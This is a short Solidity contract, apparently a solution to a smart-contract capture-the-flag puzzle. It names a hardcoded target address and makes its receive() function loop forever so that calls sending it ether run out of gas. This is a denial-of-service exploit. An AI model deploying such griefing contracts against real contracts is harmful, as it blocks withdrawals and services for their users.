// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Denier {
    address contractToDeny =
        address(0xED10216b561f8adb4C940CB99b5800033aDa02e6);

    receive() external payable {
        // run infinite loop to exhaust any calls of gas
        for (;;) {}
    }
}
